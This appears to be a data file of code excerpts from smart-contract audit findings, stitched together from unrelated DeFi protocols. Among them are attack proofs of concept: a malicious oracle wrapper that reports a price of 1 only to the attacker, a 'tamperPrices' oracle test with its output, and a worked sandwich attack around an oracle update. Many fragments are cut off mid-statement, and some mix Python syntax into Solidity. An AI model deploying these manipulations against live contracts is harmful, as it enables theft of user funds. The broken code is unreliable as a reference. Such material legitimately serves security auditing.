initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n    } else {\n        revert OrderTypeCannotBeCreated(params.orderType);\n    }\n\n    if (shouldRecordSeparateExecutionFeeTransfer) {\n        uint256 wntAmount = orderVault.recordTransferIn(wnt);\n        if (wntAmount < params.numbers.executionFee) {\n            revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n        }\n\n        GasUtils.handleExcessExecutionFee(\n            dataStore,\n            orderVault,\n            wntAmount,\n            params.numbers.executionFee\n        );\n    }\n\n    MarketUtils.getEnabledMarkets(dataStore, params.addresses.swapPath);\n\n    Order.Props memory order;\n\n    order.setAccount(account);\n    order.setReceiver(params.addresses.receiver);\n    order.setCallbackContract(params.addresses.callbackContract);\n    order.setMarket(params.addresses.market);\n    order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n    order.setSwap\n```\nstruct CreateOrderParams {\n    CreateOrderParamsAddresses addresses;\n    CreateOrderParamsNumbers numbers;\n    Order.OrderType orderType;\n    Order.DecreasePositionSwapType decreasePositionSwapType;\n    bool isLong;\n    bool shouldUnwrapNativeToken;\n    bytes32 referralCode;\n}\n\nstruct CreateOrderParamsAddresses {\n    address receiver;\n    address callbackContract;\n    address market;\n    address initialCollateralToken;\n    address[] swapPath;\n}\n```\n```\nimport { expect } from ""chai"";\nimport { mine } from ""@nomicfoundation/hardhat-network-helpers"";\nimport {\n  OrderType,\n  getOrderCount,\n  getOrderKeys,\n  createOrder,\n  executeOrder,\n  handleOrder,\n} from ""../utils/order"";\nimport { expandDecimals, decimalToFloat } from ""../utils/math"";\nimport { deployFixture } from ""../utils/fixture"";\nimport { handleDeposit } from ""../utils/deposit"";\nimport { getPositionCount, getAccountPositionCount } from ""../utils/position"";\n\ndescribe(""Execute transaction with all prices"", () => {\n  let fixture;\n  let user0;\n  let user1;\n  let user2;\n  let reader;\n  let dataStore;\n  let ethUsdMarket;\n  let ethUsdSpotOnlyMarket;\n  let wnt;\n  let usdc;\n  let attackContract;\n  let oracle;\n  let depositVault;\n  let exchangeRouter;\n  let swapHandler;\n  let executionFee;\n\n  beforeEach(async () => {\n    fixture = await deployFixture();\n\n    ({ user0, user1, user2 } = fixture.accounts);\n    ({\n      reader,\n      dataStore,\n      oracle,\n      depositVault,\n      ethUsdMarket,\n      ethUsdSpotOnlyMarket,\n      wnt,\n      usdc,\n      attackContract,\n      exchangeRouter,\n      swapHandler,\n    } = fixture.contracts);\n    ({ executionFee } = fixture.props);\n\n    await handleDeposit(fixture, {\n      create: {\n        market: ethUsdMarket,\n        longTokenAmount: expandDecimals(10000000, 18),\n        shortTokenAmount: expandDecimals(10000000 * 5000, 6),\n      },\n    });\n    await handleDeposit(fixture, {\n      create: {\n        market: ethUsdSpotOnlyMarket,\n        longTokenAmount: expandDecimals(10000000, 18),\n        shortTokenAmount: expandDecimals(10000000 * 5000, 6),\n      },\n    });\n  });\n\n  it(""Old price order execution"", async () => {\n    const path = [];\n    const UsdcBal = expandDecimals(50 * 1000, 6);\n    expect(await getOrderCount(dataStore)).to.equal(0);\n\n    for (let i = 0; i < 63; i++) {\n      if (i % 2 === 0) {\n        path.push(ethUsdMarket.marketToken);\n      } else {"
"```\nFile: MarketUtils.sol\n\ncache.fundingUsd = (cache.sizeOfLargerSide / Precision.FLOAT_PRECISION) * cache.durationInSeconds * cache.fundingFactorPerSecond;\n\nif (result.longsPayShorts) {\n    cache.fundingUsdForLongCollateral = cache.fundingUsd * cache.oi.longOpenInterestWithLongCollateral / cache.oi.longOpenInterest;\n    cache.fundingUsdForShortCollateral = cache.fundingUsd * cache.oi.longOpenInterestWithShortCollateral / cache.oi.longOpenInterest;\n} else {\n    cache.fundingUsdForLongCollateral = cache.fundingUsd * cache.oi.shortOpenInterestWithLongCollateral / cache.oi.shortOpenInterest;\n    cache.fundingUsdForShortCollateral = cache.fundingUsd * cache.oi.shortOpenInterestWithShortCollateral / cache.oi.shortOpenInterest;\n}\n```\n```\nFile: PositionUtils.sol\n\nif (position.isLong()) {\n    cache.sizeDeltaInTokens = Calc.roundUpDivision(position.sizeInTokens() * sizeDeltaUsd, position.sizeInUsd());\n} else {\n    cache.sizeDeltaInTokens = position.sizeInTokens() * sizeDeltaUsd / position.sizeInUsd();\n}\n\ncache.positionPnlUsd = cache.totalPositionPnl * cache.sizeDeltaInTokens.toInt256() / position.sizeInTokens().toInt256();\n```"
"```\n_handleDepositError(\n    key,\n    startingGas,\n    reasonBytes\n)\n```\nfunction _handleDepositError(\n    bytes32 key,\n    uint256 startingGas,\n    bytes memory reasonBytes\n) internal {\n    (string memory reason, ) = ErrorUtils.getRevertMessage(reasonBytes);\n\n    bytes4 errorSelector = ErrorUtils.getErrorSelectorFromData(reasonBytes);\n\n    if (OracleUtils.isEmptyPriceError(errorSelector)) {\n        ErrorUtils.revertWithCustomError(reasonBytes);\n    }\n\n    DepositUtils.cancelDeposit(\n        dataStore,\n        eventEmitter,\n        depositVault,\n        key,\n        msg.sender,\n        startingGas,\n        reason,\n        reasonBytes\n    );\n}\n```"
"```\nimport { expect } from ""chai"";\nimport { deployContract } from ""../../utils/deploy"";\nimport { deployFixture } from ""../../utils/fixture"";\nimport {\n  TOKEN_ORACLE_TYPES,\n  signPrices,\n  getSignerInfo,\n  getCompactedPrices,\n  getCompactedPriceIndexes,\n  getCompactedDecimals,\n  getCompactedOracleBlockNumbers,\n  getCompactedOracleTimestamps,\n} from ""../../utils/oracle"";\nimport { printGasUsage } from ""../../utils/gas"";\nimport { grantRole } from ""../../utils/role"";\nimport * as keys from ""../../utils/keys"";\n\ndescribe(""AttackOracle"", () => {\n  const { provider } = ethers;\n\n  let user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9;\n  let roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc;\n  let oracleSalt;\n\n  beforeEach(async () => {\n    const fixture = await deployFixture();\n    ({ user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9 } = fixture.accounts);\n\n    ({ roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc } = fixture.contracts);\n    ({ oracleSalt } = fixture.props);\n  });\n\n  it(""inits"", async () => {\n    expect(await oracle.oracleStore()).to.eq(oracleStore.address);\n    expect(await oracle.SALT()).to.eq(oracleSalt);\n  });\n\n  it(""tamperPrices"", async () => {\n    const blockNumber = await provider.getBlock().then((block) => block.number);\n    const blockTimestamp = await provider.getBlock().then((block) => block.timestamp);\n\n    await dataStore.setUint(keys.MIN_ORACLE_SIGNERS, 2);\n    const block = await provider.getBlock(blockNumber);\n\n    let signerInfo = getSignerInfo([0, 1]);\n    let minPrices = [1000, 1000]; // if some signers sign a same price\n    let maxPrices = [1010, 1010]; // if some signers sign a same price\n    let signatures = await signPrices({\n      signers: [signer0, signer1],\n      salt: oracleSalt,\n      minOracleBlockNumber: blockNumber,\n      maxOracleBlockNumber: blockNumber,\n      oracleTimestamp: blockTimestamp,\n      blockHash: block.hash,\n      token\n```\nnpx hardhat test.\test\oracle\AttackOracle.ts\n\n  AttackOracle\n    √ inits\n    √ tamperPrices (105ms)\n\n  2 passing (13s)\n```"
"```\nif (a < 0 and b <= type(int256).min - a):\n    return type(int256).min\n```\n```\nreturn a - b;\n```\n```\nfunction testBoundedSub() public pure returns (int256) {\n    return boundedSub(type(int256).min + 3, 4);\n}\n```"
"```\nuint256 wstethOhmPrice = manager.getTknOhmPrice();\nuint256 expectedWstethAmountOut = (ohmAmountOut * wstethOhmPrice) / _OHM_DECIMALS;\n\nuint256 wstethToReturn = wstethAmountOut > expectedWstethAmountOut\n   ? expectedWstethAmountOut\n    : wstethAmountOut;\n\nif (wstethAmountOut > wstethToReturn) {\n    wsteth.safeTransfer(TRSRY(), wstethAmountOut - wstethToReturn);\n}\n```\n```\nTransaction 1:\n\n    Balances before attack (0.995:1)\n    Liquidity: 79.8 OHM 80.2 wstETH\n    Adversary: 20 wstETH\n\n    Swap OHM so that pool price matches pre-update oracle price:\n    Liquidity: 80 OHM 80 wstETH\n    Adversary: -0.2 OHM 20.2 wstETH\n\n    Balances after adversary has deposited to the pool:\n    Liquidity: 100 OHM 100 wstETH\n    Adversary: -0.2 OHM 0.2 wstETH\n\n    Balances after adversary sells wstETH for OHM (0.5% movement in price):\n    Liquidity: 99.748 OHM 100.252 wstETH\n    Adversary: 0.052 OHM -0.052 wstETH\n\nSandwiched Oracle Update:\n\n    Oracle updates price of wstETH to 0.995 OHM. Since the attacker already sold wstETH to balance \n    the pool to the post-update price they will be able to withdraw the full amount of wstETH.\n\nTransaction 2:\n\n    Balances after adversary removes their liquidity:\n    Liquidity: 79.798 OHM 80.202 wstETH\n    Adversary: 0.052 OHM 19.998 wstETH\n\n    Balances after selling profited OHM:\n    Liquidity: 79.849 OHM 80.152 wstETH\n    Adversary: 20.05 wstETH\n```"
"```\n_exitBalancerPool(lpAmount_, minTokenAmounts_);\n\nuint256 ohmAmountOut = ohm.balanceOf(address(this)) - ohmBefore;\nuint256 wstethAmountOut = wsteth.balanceOf(address(this)) - wstethBefore;\n\nuint256 wstethOhmPrice = manager.getTknOhmPrice();\nuint256 expectedWstethAmountOut = (ohmAmountOut * wstethOhmPrice) / _OHM_DECIMALS;\n\nuint256 wstethToReturn = wstethAmountOut > expectedWstethAmountOut\n   ? expectedWstethAmountOut\n    : wstethAmountOut;\n\nif (wstethAmountOut > wstethToReturn) {\n    wsteth.safeTransfer(TRSRY(), wstethAmountOut - wstethToReturn);\n}\n\nohm.increaseAllowance(MINTR(), ohmAmountOut);\nmanager.burnOhmFromVault(ohmAmountOut);\n\nwsteth.safeTransfer(msg.sender, wstethToReturn);\n```"
"```\nfunction stakeFor(address _for, uint256 _amount)\n    public\n    returns(bool)\n{\n    _processStake(_amount, _for);\n\n    stakingToken.safeTransferFrom(msg.sender, address(this), _amount);\n    emit Staked(_for, _amount);\n\n    return true;\n}\n```\n```\nmanager.decreaseTotalLp(lpAmount_);\n\nauraRewardPool().withdrawAndUnwrap(lpAmount_, claim_)\n\n_exitBalancerPool(lpAmount_, minTokenAmounts_)\n```\nfunction decreaseTotalLp(uint256 amount_) external override onlyWhileActive onlyVault {\n    if (amount_ > totalLp) {\n        revert BLManagerLido_InvalidLpAmount();\n    }\n    totalLp -= amount_;\n}\n```"
"```\nuint256 ohmWstethPrice = manager.getOhmTknPrice();\nuint256 ohmMintAmount = (amount_ * ohmWstethPrice) / _WSTETH_DECIMALS;\n\n// Block scope to avoid stack too deep\n{\n    uint256 bptBefore = liquidityPool.balanceOf(address(this));\n    wsteth.safeTransferFrom(msg.sender, address(this), amount_);\n    manager.mintOhmToVault(ohmMintAmount);\n    _joinBalancerPool(ohmMintAmount, amount_, minLpAmount_);\n}\n```\n```\nuint256[] memory maxAmountsIn = new uint256[](2);\nmaxAmountsIn[0] = ohmAmount_;\nmaxAmountsIn[1] = wstethAmount_;\n\nJoinPoolRequest memory joinPoolRequest = JoinPoolRequest(\n    assets,\n    maxAmountsIn,\n    abi.encode(1, maxAmountsIn, minLpAmount_),\n    false\n);"
"```\nfunction getTknOhmPrice() public view override returns (uint256) {\n    uint256 stethPerWsteth = IWsteth(pairToken).stEthPerToken();\n\n    uint256 ethPerOhm = _validatePrice(ohmEthPriceFeed.feed, ohmEthPriceFeed.updateThreshold);\n\n    uint256 stethPerEth = _validatePrice(\n        stethEthPriceFeed.feed,\n        stethEthPriceFeed.updateThreshold\n    );\n\n    return (ethPerOhm * 1e36) / (stethPerWsteth * stethPerEth);\n}\n```\n```\nuint256 wstethOhmPrice = manager.getTknOhmPrice();\nuint256 expectedWstethAmountOut = (ohmAmountOut * wstethOhmPrice) / _OHM_DECIMALS;\n\nuint256 wstethToReturn = wstethAmountOut > expectedWstethAmountOut\n   ? expectedWstethAmountOut\n    : wstethAmountOut;\n\nif (wstethAmountOut > wstethToReturn) {\n    wsteth.safeTransfer(TRSRY(), wstethAmountOut - wstethToReturn);\n}\n```"
```\nOHM token balance: 100_000\nwstETH token balance: 1_000\nTotal LP: 10_000\n```
"```\nfunction _swapPTsForTarget(\n    address adapter,\n    uint256 maturity,\n    uint256 ptBal,\n    PermitData calldata permit\n) internal returns (uint256 tBal) {\n    _transferFrom(permit, divider.pt(adapter, maturity), ptBal);\n\n    if (divider.mscale(adapter, maturity) > 0) {\n        tBal = divider.redeem(adapter, maturity, ptBal);\n    } else {\n        tBal = _balancerSwap(\n            divider.pt(adapter, maturity),\n            Adapter(adapter).target(),\n            ptBal,\n            BalancerPool(spaceFactory.pools(adapter, maturity)).getPoolId(),\n            0,\n            payable(address(this))\n        );\n    }\n}\n```"
"```\nif (address(quote.sellToken)!= ETH) {\n    _transferFrom(permit, stake, stakeSize);\n}\n\nif (address(quote.sellToken)!= stake) {\n    _fillQuote(quote);\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract RollerPeriphery {\n    function someFunction() public {\n        boughtAmount = address(quote.buyToken) == ETH? address(this).balance : quote.buyToken.balanceOf(address(this));\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ncontract RollerPeriphery {\n    // Refund any unspent protocol fees (paid in ether) to the sender.\n    uint256 refundAmt = address(this).balance;\n}\n```\n```\nif (address(quote.buyToken) == ETH) {\n    refundAmt = refundAmt - boughtAmount;\n}\npayable(msg.sender).transfer(refundAmt);\n```\naddress(quote.buyToken) == ETH\n   ? payable(receiver).transfer(amtOut)\n    : ERC20(address(quote.buyToken)).safeTransfer(receiver, amtOut);\n```"
"```\nif (address(quote.sellToken)!= ETH) {\n    _transferFrom(permit, stake, stakeSize);\n}\n\nif (address(quote.sellToken)!= stake) {\n    _fillQuote(quote);\n}\n```"
"```\nfunction _swapPTsForTarget(\n    address adapter,\n    uint256 maturity,\n    uint256 ptBal,\n    PermitData calldata permit\n) internal returns (uint256 tBal) {\n    _transferFrom(permit, divider.pt(adapter, maturity), ptBal);\n\n    if (divider.mscale(adapter, maturity) > 0) {\n        tBal = divider.redeem(adapter, maturity, ptBal);\n    } else {\n        tBal = _balancerSwap(\n            divider.pt(adapter, maturity),\n            Adapter(adapter).target(),\n            ptBal,\n            BalancerPool(spaceFactory.pools(adapter, maturity)).getPoolId(),\n            0,\n            payable(address(this))\n        );\n    }\n}\n```"
"```\nfunction _addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n    // Create the pair if it doesn't exist yet\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    }\n    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n    if (reserveA == 0 && reserveB == 0) {\n        (amountA, amountB) = (amountADesired, amountBDesired);\n    } else {\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n        if (amountBOptimal <= amountBDesired) {\n            require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n            (amountA, amountB) = (amountADesired, amountBOptimal);\n        } else {\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal <= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n        }\n    }\n}\n\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(token\n```\ndef modifier(ensure):\n    require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED')\n    _;\n```\n```\n        // Calculate market length and check time bounds\n        uint48 length = uint48(params_.conclusion - block.timestamp);\n        if (\n            length < minMarketDuration ||\n            params_.depositInterval < minDepositInterval ||\n            params_.depositInterval > length\n        ) {\n            revert Auctioneer_InvalidParams();\n        }\n\n        // Calculate the maximum payout amount for this market, determined by deposit interval\n        uint256 capacity = params_.capacityInQuote\n           ? params_.capacity.mulDiv(scale, price)\n            : params_.capacity;\n        market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n```\n```\n        // Payout for the deposit = amount / price\n        payout = amount_.mulDiv(term.scale, price);\n\n        // Payout must be greater than user inputted minimum\n        if (payout < minAmountOut_) {\n            revert Auctioneer_AmountLessThanMinimum();\n        }\n\n        // Markets have a max payout amount, capping size because deposits\n        // do not experience slippage. max payout is recalculated upon tuning\n        if (payout > market.maxPayout) {\n            revert Auctioneer_MaxPayoutExceeded();\n        }\n```"
"```\nfunction _createMarket(MarketParams memory params_) internal returns (uint256) {\n    // Calculate the maximum payout amount for this market\n    uint256 capacity = params_.capacityInQuote\n       ? params_.capacity.mulDiv(\n            scale,\n            price.mulDivUp(\n                uint256(ONE_HUNDRED_PERCENT - params_.fixedDiscount),\n                uint256(ONE_HUNDRED_PERCENT)\n            )\n        )\n        : params_.capacity;\n    market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n}\n```\n```\nfunction _createMarket(MarketParams memory params_) internal returns (uint256) {\n    // Calculate the maximum payout amount for this market, determined by deposit interval\n    uint256 capacity = params_.capacityInQuote\n       ? params_.capacity.mulDiv(scale, price)\n        : params_.capacity;\n    market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n}\n```\n```\nfunction _validateOracle(\n    uint256 id_,\n    IBondOracle oracle_,\n    ERC20 quoteToken_,\n    ERC20 payoutToken_,\n    uint48 baseDiscount_\n) {\n    // Get the price decimals for the current oracle price\n    // Oracle price is in quote tokens per payout token\n    // E.g. if quote token is $10 and payout token is $2000,\n    // then the oracle price is 200 quote tokens per payout token.\n    // If the oracle has 18 decimals, then it would return 200 * 10^18.\n    // In this case, the price decimals would be 2 since 200 = 2 * 10^2.\n    // We apply the base discount to the oracle price before calculating\n    // since this will be the initial equilibrium price of the market.\n    int8 priceDecimals = _getPriceDecimals(\n        currentPrice.mulDivUp(\n            uint256(ONE_HUNDRED_PERCENT - baseDiscount_),\n            uint256(ONE_HUNDRED_PERCENT)\n        ),\n        oracleDecimals\n    );\n```"
"```\nmodifier checkpointProtection(address account) {\n    uint256 numCheckpoints = _stakes[account]._checkpoints.length;\n    require(numCheckpoints == 0 || _stakes[account]._checkpoints[numCheckpoints - 1]._blockNumber!= block.number, ""StakingModule: Cannot exit in the same block as another stake or exit"");\n}\n```"
"```\nrequire(\n    value == 0 || \n    token.allowance(address(this), spender) == 0,\n    ""SafeERC20: approve from non-zero to non-zero allowance""\n);"
```\n_withholdTau((tauReturned * _rewardProportion) / Constants.PERCENT_PRECISION)
"```\nconst basicSwapParams = buildUniswapSwapAdapterData(\n  [""0xyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"", ""0xzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz""],\n  [3000],\n  testDepositAmount,\n  expectedReturnAmount,\n  0,\n).swapData;\n```\n000000000000000000000000000000000000000000000000000000024f49cbca\n0000000000000000000000000000000000000000000000056bc75e2d63100000\n0000000000000000000000000000000000000000000000055de6a779bbac0000\n0000000000000000000000000000000000000000000000000000000000000080\n000000000000000000000000000000000000000000000000000000000000002b\nyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy000bb8zzzzzzzzzzzzzzzzzz\nzzzzzzzzzzzzzzzzzzzzzz000000000000000000000000000000000000000000\n```\n```\nconst basicSwapParams = buildUniswapSwapAdapterData(\n  [\n    ""0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"",\n    ""0xyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"",\n    ""0xzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz""\n  ],\n  [3000, 3000],\n  testDepositAmount,\n  expectedReturnAmount,\n  0\n).swapData;\n```\n000000000000000000000000000000000000000000000000000000024f49cbca\n0000000000000000000000000000000000000000000000056bc75e2d63100000\n0000000000000000000000000000000000000000000000055de6a779bbac0000\n0000000000000000000000000000000000000000000000000000000000000080\n0000000000000000000000000000000000000000000000000000000000000042\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000bb8yyyyyyyyyyyyyyyyyy\nyyyyyyyyyyyyyyyyyyyyyy000bb8zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\nzzzz000000000000000000000000000000000000000000000000000000000000\n```"
"```\nfunction _decreaseCurrentMinted(address account, uint256 amount) internal virtual {\n    uint256 accountMinted = currentMinted[account];\n    if (accountMinted >= amount) {\n        currentMinted[msg.sender] = accountMinted - amount;\n    }\n}\n```"
```\nuint256 collateralToLiquidateWithoutDiscount = (_debtToLiquidate * (10 ** decimals)) / price;\nuint256 collateralToLiquidate = (collateralToLiquidateWithoutDiscount * totalLiquidationDiscount) / Constants.PRECISION;\nif (collateralToLiquidate > _accountCollateral) {\n    collateralToLiquidate = _accountCollateral;\n}\nuint256 liquidationSurcharge = (collateralToLiquidateWithoutDiscount * LIQUIDATION_SURCHARGE) / Constants.PRECISION;\n```\n```\nuint256 collateralToLiquidator = collateralToLiquidate - liquidationSurcharge;\n```
```\naddress internal constant WETH = 0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2;\n```
"```\n2. Multisig. Trusted with essentially everything but user collateral.\n```\n```\nfunction updateWrapper(address _underlying, address _wrapperAddress) external override onlyOwner {\n    if (!_wrapperAddress.isContract()) {\n        revert notContract();\n    }\n    if (wrapperAddressMap[_underlying] == address(0)) {\n        revert wrapperNotRegistered(_wrapperAddress);\n    }\n\n    wrapperAddressMap[_underlying] = _wrapperAddress;\n\n    emit WrapperUpdated(_underlying, _wrapperAddress);\n}\n```\n```\ncontract AttackOracleWrapper is IOracleWrapper, Ownable {\n    address public attacker;\n    IGLPManager public glpManager;\n\n    constructor(address _attacker, address glp) {\n        attacker = _attacker;\n        glpManager = IGLPManager(glp);\n    }\n\n    function getExternalPrice(\n        address _underlying,\n        bytes calldata _flags\n    ) external view returns (uint256 price, uint8 decimals, bool success) {\n        if (tx.origin == attacker) {\n            return (1, 18, true);\n        } else {\n            uint256 price = glpManager.getPrice();\n            return (price, 18, true);\n        }\n    }\n}\n```\nfunction liquidate(\n    address _account,\n    uint256 _debtAmount,\n    uint256 _minExchangeRate\n) external onlyLiquidator whenNotPaused updateReward(_account) returns (bool) {\n    if (_debtAmount == 0) {\n        revert wrongLiquidationAmount();\n    }\n\n    UserDetails memory accDetails = userDetails[_account];\n\n    if (_debtAmount > accDetails.debt) {\n        _debtAmount = accDetails.debt;\n    }\n\n    (uint256 collateralToLiquidate, uint256 liquidationSurcharge) = _calcLiquidation(\n        accDetails.collateral,\n        accDetails.debt,\n        _debtAmount\n    );\n\n    uint256 collateralToLiquidator = collateralToLiquidate - liquidationSurcharge;\n    if (collateralToLiquidator < (_debtAmount * _minExchangeRate) / Constants.PRECISION) {\n        revert insufficientCollateralLiquidated(_debtAmount, collateralToLiquidator);\n    }\n\n    userDetails[_account].collateral = accDetails.collateral - collateralToLiquidate;\n    userDetails[_account].debt = accDetails.debt - _debtAmount;\n\n    TAU(tau).burnFrom(msg.sender, _debtAmount);\n\n    IERC20(collateralToken).safeTransfer(msg.sender, collateralToLiquidator);\n    IERC20(collateralToken).safeTransfer(\n        Controller(controller).addressMapper(Constants.FEE_SPLITTER),\n        liquidationSurcharge\n    );\n\n    emit AccountLiquidated(msg.sender, _account, collateralToLiquidate, liquidationSurcharge);\n\n    return true;\n}\n```"
"```\nfunction liquidate(\n    address _account,\n    uint256 _debtAmount,\n    uint256 _minExchangeRate\n) external onlyLiquidator whenNotPaused updateReward(_account) returns (bool) {\n    if (_debtAmount == 0) {\n        revert wrongLiquidationAmount();\n    }\n\n    UserDetails memory accDetails = userDetails[_account];\n\n    if (_debtAmount > accDetails.debt) {\n        _debtAmount = accDetails.debt;\n    }\n\n    (uint256 collateralToLiquidate, uint256 liquidationSurcharge) = _calcLiquidation(\n        accDetails.collateral,\n        accDetails.debt,\n        _debtAmount\n    );\n}\n```\nfunction _calcLiquidation(\n    uint256 _accountCollateral,\n    uint256 _accountDebt,\n    uint256 _debtToLiquidate\n) internal view returns (uint256 collateralToLiquidate, uint256 liquidationSurcharge) {\n    if (_debtToLiquidate > _getMaxLiquidation(_accountCollateral, _accountDebt, price, decimals, totalLiquidationDiscount)) {\n        revert wrongLiquidationAmount();\n    }\n```\n```\nfunction _getMaxLiquidation(\n    uint256 _collateral,\n    uint256 _debt,\n    uint256 _price,\n    uint8 _decimals,\n    uint256 _liquidationDiscount\n) internal pure returns (uint256 maxRepay) {\n    maxRepay = \n        ((MAX_LIQ_COLL_RATIO * _debt) - ((_collateral * _price * Constants.PRECISION) / (10 ** _decimals))) /\n        (MAX_LIQ_COLL_RATIO - _liquidationDiscount);\n\n    if (maxRepay > _debt) {\n        maxRepay = _debt;\n    }\n\n    return maxRepay;\n}\n```"
"```\nmodifier onlySource(address _originSender, uint32 _origin) {\n    require(_originSender == trustedRemoteConnext[_origin] && msg.sender == connext, ""Not trusted"");\n}\n```\n```\n(bool success, bytes memory returnData) = \nExcessivelySafeCall.excessivelySafeCall(\n    _params.to,\n    gasleft() - Constants.EXECUTE_CALLDATA_RESERVE_GAS,\n    0,  # native asset value (always 0)\n    Constants.DEFAULT_COPY_BYTES, \n    abi.encodeWithSelector(\n        IXReceiver.xReceive.selector,\n        _transferId,\n        _amount,\n        _asset,\n        _reconciled? _params.originSender : address(0), \n        _params.originDomain,\n        _params.callData\n    )\n);\n```"
"```\nuint256 relayerFee = _relayerFee!= 0? _relayerFee : msg.value;\n\nIConnext(connext).xcall{value: relayerFee}(\n    _destinationDomain,  // _destination: Domain ID of the destination chain\n    target,  // _to: address of the target contract\n    address(0),  // _asset: use address zero for 0-value transfers\n    msg.sender,  // _delegate: address that can revert or forceLocal on destination\n    0,  // _amount: 0 because no funds are being transferred\n    0,  // _slippage: can be anything between 0-10000 because no funds are being transferred\n    _callData  // _callData: the encoded calldata to send\n);\n```\n```\nIConnext(connext).xcall({\n    value: (msg.value - _relayerFee)\n}(\n    _destinationDomain, // _destination: Domain ID of the destination chain\n    _recipient, // _to: address receiving the funds on the destination\n    _token, // _asset: address of the token contract\n    msg.sender, // _delegate: address that can revert or forceLocal on destination\n    _amount, // _amount: amount of tokens to transfer\n    _slippage, // _slippage: the maximum amount of slippage the user will accept in BPS (e.g. 30 = 0.3%)\n    bytes("""")\n));\n```\nparams.delegate | (optional)\n    Address allowed to cancel an xcall on destination.\n```"
"```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n        require(whitelist[msg.sender]);\n        uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n        require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n```"
"```\nfunction rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n    if (amountToSendXChain > getVaultBalance()) {\n        pullFunds(amountToSendXChain);\n        if (amountToSendXChain > getVaultBalance()) {\n            amountToSendXChain = getVaultBalance();\n        }\n    }\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n        vaultNumber,\n        amountToSendXChain,\n        address(vaultCurrency),\n        _slippage,\n        _relayerFee\n    );\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n}\n```\nif (amountToSendXChain > getVaultBalance()):\n    pullFunds(amountToSendXChain)\nif amountToSendXChain > getVaultBalance():\n    amountToSendXChain = getVaultBalance()\n```"
"```\nfunction addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) {\n        return;\n    }\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) {\n        return;\n    }\n\n    for (uint k = 0; k < chainIds.length; k++) {\n        uint32 chain = chainIds[k];\n        uint256 latestProtocol = latestProtocolId[chain];\n\n        for (uint i = 0; i < latestProtocol; i++) {\n            int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n            if (allocation == 0) {\n                continue;\n            }\n\n            int256 lastRebalanceReward = getRewardsPerLockedToken(\n                vaultNum,\n                chain,\n                lastRebalancingPeriod,\n                i\n            );\n            int256 currentReward = getRewardsPerLockedToken(\n                vaultNum,\n                chain,\n                currentRebalancingPeriod,\n                i\n            );\n            baskets[_basketId].totalUnRedeemedRewards +=\n                (currentReward - lastRebalanceReward) * allocation;\n        }\n    }\n}"
